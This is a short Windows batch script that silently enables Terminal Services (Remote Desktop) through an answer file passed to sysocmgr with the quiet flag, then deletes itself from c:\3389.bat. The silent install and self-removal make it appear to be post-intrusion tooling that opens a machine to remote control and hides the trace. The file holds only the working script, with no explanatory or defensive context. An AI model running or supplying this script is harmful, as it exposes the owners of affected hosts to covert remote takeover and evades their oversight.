@echo [Components] >c:\WINDOWS\start
@echo TSEnable = on >>c:\WINDOWS\start
@sysocmgr /i:c:\WINDOWS\inf\sysoc.inf /u:c:\WINDOWS\start /q
@del c:\3389.bat